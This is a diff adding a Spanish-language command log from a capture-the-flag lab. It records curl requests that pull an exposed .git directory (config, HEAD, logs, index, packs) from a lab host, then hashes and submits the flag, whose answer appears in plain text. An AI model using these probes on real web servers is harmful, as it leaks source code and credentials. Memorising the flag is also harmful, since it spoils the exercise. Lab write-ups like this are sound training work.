@@ -1,0 +1,28 @@
+# Bitácora cronológica de comandos — Lab 06, Reto 2 (Grupo 10)
+# Fecha: 2026-11-01
+
+# 1. Verificación de conectividad inicial al objetivo
+curl -i -s http://phantomcorp/
+
+# 2. Comprobación del archivo de configuración de Git
+curl -i -s http://phantomcorp/.git/config
+
+# 3. Comprobación del puntero HEAD
+curl -i -s http://phantomcorp/.git/HEAD
+
+# 4. Exploración de metadatos, historial y objetos adicionales de Git
+curl -i -s http://phantomcorp/.git/logs/HEAD
+curl -i -s http://phantomcorp/.git/index
+curl -i -s http://phantomcorp/.git/objects/info/packs
+curl -i -s http://phantomcorp/.git/description
+curl -i -s http://phantomcorp/.git/COMMIT_EDITMSG
+curl -i -s http://phantomcorp/.git/
+
+# 5. Validación criptográfica de la flag encontrada
+echo -n 'FLAG{git_repo_exposed}' | sha256sum
+
+# 6. Registro formal de la flag en el sistema CTF
+./ctf submit 06 R2 'FLAG{git_repo_exposed}'
+
+# 7. Verificación del estado actualizado del laboratorio
+./ctf status 06
